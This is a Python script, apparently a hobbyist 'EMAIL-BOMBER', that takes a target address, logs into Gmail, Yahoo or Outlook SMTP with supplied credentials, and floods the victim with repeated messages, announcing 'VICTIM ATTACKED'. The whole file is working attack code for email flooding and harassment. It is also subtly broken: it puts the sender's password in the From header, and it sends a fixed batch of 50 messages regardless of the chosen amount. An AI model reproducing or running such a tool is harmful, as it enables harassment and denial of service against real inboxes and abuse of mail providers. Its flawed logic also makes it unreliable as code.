from os import get_terminal_size
import smtplib
import sys
import time
from termcolor import colored



def banner():
    print(colored('$+$+$+$+$+ EMAIL-BOMBER +$+$+$+$+$','magenta'))
    print(colored('$+$+$+$+$+ MADE-WITH-CODES +$+$+$+$+$','magenta'))
    print(colored("""
               ___   /|  /|   $   ___   __          ___   __  __
              |___  / | / |   $  0___) |  | |\ |\  0___) |__ |__|
              |___ /  |/  |   $  0___) |__| | \| \ 0___) |__ |  \    
                              
                               Author:luv 
                               *  * *  *
                              *    *    *
                              *         *
                                *     *
                                   *

                            ***+***
                              |||
                         ______$______
                        |$$$$$$$$$$$$$|
                        |$$$$$$$$$$$$$|
                       |$$$$$$$$$$$$$$$|
                    |$$$$$$$$$$$$$$$$$$$$$|
                 |$$$$$$$$$$$$$$$$$$$$$$$$$$$|
                |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
              |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
              |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
            |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|   
           |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
          |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
          |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
          |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
           |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
            |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
             |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
              |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
               |$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
                |$$$$$$$$$$$$$$$$$$$$$$$$$$$$|
                  |$$$$$$$$$$$$$$$$$$$$$$$$$|
                    |$$$$$$$$$$$$$$$$$$$$$|
                      *******************
                       
    """,'magenta'))
  


class Email_Bomber:
  count=0
  
  def __init__(self):
    try:
      print(colored("$+$+$+$+$+ EMAIL-BOMBER Initializing +$+$+$+$+$",'green'))
      self.target = str(input(colored('enter target email<: ','magenta')))
      self.mode = int(input(colored("""Enter Bomb mode:
                                (1,2,3,4)
                 1:1000|2:500|3:250|4:custom""",'magenta')))

      if int(self.mode)>int(4) or int(self.mode)<int(1):
        print(colored('ERROR: Invalid option.Goodbye','green'))
        sys.exit(1)
    except Exception as e:
      print(f'Error:{e}')

  def bomb(self):
    try:
      print(colored('$+$+$+$+$+ SETTING UP BOMB+$+$+$+$+$','green'))
      self.amount = None
      if self.mode ==int(1):
        self.amount = int(1000)
      elif self.mode ==int(2):
        self.amount=int(500)
      elif self.mode ==int(3):
        self.amount=int(250)
      else:
        self.amount = int(input(colored('choose a custom amount <:','magenta')))

      print(colored(f'$+$+$+$+$+ you have selected bomb mode as:{self.mode} and {self.amount} emails +$+$+$+$+$','green'))


    except Exception as e:
      print(f'ERROR:{e}')


  def email(self):
    try:
      print(colored('\n+[+[+[ Setting up email ]+]+]+','green'))
      self.server = str(input(colored( 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: ','magenta')))
      premade = ['1', '2', '3']
      default_port = True
      if self.server not in premade:
        default_port = False
        self.port = int(input(colored('Enter port number <: ','magenta')))

      if default_port==True:
        self.port=int(587)

      if self.server=='1':
        self.server= 'smtp.gmail.com'
      elif self.server=='2':
        self.server='smtp.mail.yahoo.com'
      elif self.server=='3':
        self.server='smtp-mail.outlook.com'

      self.fromAddr=str(input(colored('ENTER FROM ADDRESS<:','magenta')))
      self.fromPwd=str(input(colored('ENTER FROM PASSWORD<:','magenta')))
      self.subject=str(input(colored('ENTER SUBJECT<:','magenta')))
      self.message=str(input(colored('ENTER MESSAGE<:','magenta')))

      self.msg = """ From: %s\nTo: %s\nSubject %s\n%s\n
      """ %(self.fromPwd,self.target,self.subject,self.message)

      self.s = smtplib.SMTP(self.server,self.port)
      self.s.ehlo()
      self.s.starttls()
      self.s.ehlo()
      self.s.login(self.fromAddr,self.fromPwd)
    
    except Exception as e:
      print(f'ERROR: {e}')

  def send(self):
    try:
      self.s.sendmail(self.fromAddr,self.target,self.msg)
      self.count+=1
      print(colored(f"BOMB:{self.count} $$BLASTED$$",'yellow'))
    except Exception as e:
      print(f'ERROR:{e}')

  def attack(self):
    for email in range(20):
      print(colored('$+$+$+$+$+ Attempting secure login $+$+$+$+$','green'))
      self.s.login(self.fromAddr,self.fromPwd)
      print(colored('$+$+$+$+$+ Attacking parts for 50 batch $+$+$+$+$','green'))
    for email in range(50):
      self.send()
      time.sleep(0.5)
    time.sleep(60)
    self.s.close()
    print(colored('$+$+$+$+$+ VICTIM ATTACKED $+$+$+$+$','green'))
    sys.exit(0)

if __name__=='__main__':
  banner()
  bomb=Email_Bomber()
  bomb.bomb()
  bomb.email()
  bomb.attack()

  